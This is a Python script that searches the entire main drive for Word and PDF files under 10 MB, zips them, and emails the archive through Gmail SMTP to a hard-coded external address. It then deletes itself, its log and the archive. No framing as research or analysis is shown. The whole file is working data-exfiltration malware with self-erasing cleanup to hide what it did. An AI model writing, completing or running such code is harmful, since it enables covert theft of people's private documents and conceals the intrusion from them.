import os
import socket
import time
import logging
import zipfile
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

MAX_RETRIES = 20
RETRY_WAIT_SECONDS = 300

# Configure logging
LOG_FILE_NAME = 'script_log.txt'
logging.basicConfig(filename=LOG_FILE_NAME, level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')


def log_info(message):
    """Log information."""
    logging.info(message)
    print(message)


def log_error(message):
    """Log errors."""
    logging.error(message)

    print(message)


def find_files_under_size(folder_path, max_size_bytes, allowed_extensions):
    found_files = []
    retry_count = 0

    while retry_count < MAX_RETRIES:
        try:
            for root, dirs, files in os.walk(folder_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    if file.lower().endswith(allowed_extensions) and os.path.getsize(file_path) < max_size_bytes:
                        found_files.append(file_path)
            break
        except Exception as e:
            log_error(f"An error occurred while searching for files: {e}")
            retry_count += 1
            if retry_count < MAX_RETRIES:
                log_info(f"Retrying... Attempt {retry_count}")
            else:
                log_error("Max retry attempts reached. Skipping file search.")

    return found_files


def check_internet_connection():
    try:
        socket.create_connection(('8.8.8.8', 53), timeout=2)

        return True
    except Exception:
        return False


def create_zip_archive(file_paths, zip_file_name):
    with zipfile.ZipFile(zip_file_name, 'w') as zipf:
        for file_path in file_paths:
            zipf.write(file_path, arcname=os.path.basename(file_path))


def send_email(zip_file, log_file):
    sender_email = "YOUR_SENDER_EMAIL@gmail.com"  # Sender's email address
    sender_password = "YOUR_SENDER_PASSWORD"  # Sender's email password
    receiver_email = "loorissnoual@gmail.com"  # Receiver's email address

    message = MIMEMultipart()
    message['From'] = sender_email
    message['To'] = receiver_email
    message['Subject'] = "Files from Script"

    part = MIMEBase('application', "octet-stream")
    part.set_payload(open(zip_file, "rb").read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', 'attachment; filename="files_to_upload.zip"')
    message.attach(part)

    part = MIMEBase('application', "octet-stream")
    part.set_payload(open(log_file, "rb").read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', 'attachment; filename="script_log.txt"')
    message.attach(part)

    try:
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()

            server.login(sender_email, sender_password)
            server.sendmail(sender_email, receiver_email, message.as_string())
            log_info("Email sent successfully.")
    except Exception as e:
        log_error(f"An error occurred while sending the email: {e}")

def main():
    log_info("Script started.")

    try:
        # Get the main drive path
        main_drive_path = os.path.abspath(os.sep)

        # Set the maximum file size and allowed extensions
        max_file_size = 10 * 1024 * 1024
        allowed_extensions = ('.docx', '.doc', '.pdf')

        # Find files under the specified size and extensions in the main drive
        found_files_list = find_files_under_size(main_drive_path, max_file_size, allowed_extensions)

        log_info("Files found:")
        for found_file in found_files_list:
            log_info(f"- {found_file}")

        # Create a zip archive
        zip_file_name = 'files_to_upload.zip'
        create_zip_archive(found_files_list, zip_file_name)

        # Wait for 3 seconds before sending the log file
        time.sleep(3)

        # Send the email if connected to Wi-Fi
        if check_internet_connection():
            send_email(zip_file_name, LOG_FILE_NAME)

    except Exception as e:
        log_error(f"An error occurred: {e}")

    # Auto destroy the script (delete the script file, log file, and zip file)
    script_file_path = os.path.abspath(__file__)
    try:
        os.remove(script_file_path)
        log_info("Script file deleted successfully.")
    except Exception as e:
        log_error(f"An error occurred while deleting the script file: {e}")

    try:
        os.remove(LOG_FILE_NAME)
        log_info("Log file deleted successfully.")
    except Exception as e:
        log_error(f"An error occurred while deleting the log file: {e}")

    try:

        os.remove(zip_file_name)
        log_info("Zip file deleted successfully.")
    except Exception as e:
        log_error(f"An error occurred while deleting the zip file: {e}")

    log_info("Script completed.")


if __name__ == "__main__":
    main()
